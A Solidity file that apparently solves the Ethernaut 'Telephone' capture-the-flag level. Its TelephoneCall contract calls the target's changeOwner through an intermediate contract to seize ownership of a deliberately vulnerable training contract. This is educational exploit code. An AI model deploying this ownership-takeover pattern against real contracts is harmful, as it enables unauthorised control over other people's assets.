// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * @title ITelephone
 * @dev Interface for the Telephone contract from the Ethernaut CTF challenge
 */
interface ITelephone {
    /**
     * @dev Changes the owner of the Telephone contract
     * @param _owner The new owner of the contract
     */
    function changeOwner(address _owner) external;
    
    /**
     * @dev Returns the owner of the Telephone contract
     * @return The owner of the contract
     */
    function owner() external view returns (address);
}

/**
 * @title TelephoneCall
 * @dev Solution contract for the Telephone Ethernaut challenge
 * @notice This contract call changeOwner method and change the owner of the Telephone contract
 * @custom:security-contact security@example.com
 */
contract TelephoneCall {
    /// @notice Reference to the target Telephone contract
    ITelephone public telephone;
    
    /// @notice Address of the target Telephone contract
    address public telephoneAddress;
    
    /**
     * @dev Constructor sets the address of the Telephone contract to attack
     * @param _telephoneAddress The address of the deployed Telephone contract
     */
    constructor(address _telephoneAddress) {
        telephoneAddress = _telephoneAddress;
        telephone = ITelephone(telephoneAddress);
    }

    /**
     * @dev Changes the owner of the Telephone contract
     * @notice This function calls the changeOwner method of the Telephone contract
     */
    function claimOwnership() public {
        telephone.changeOwner(msg.sender);
    }
}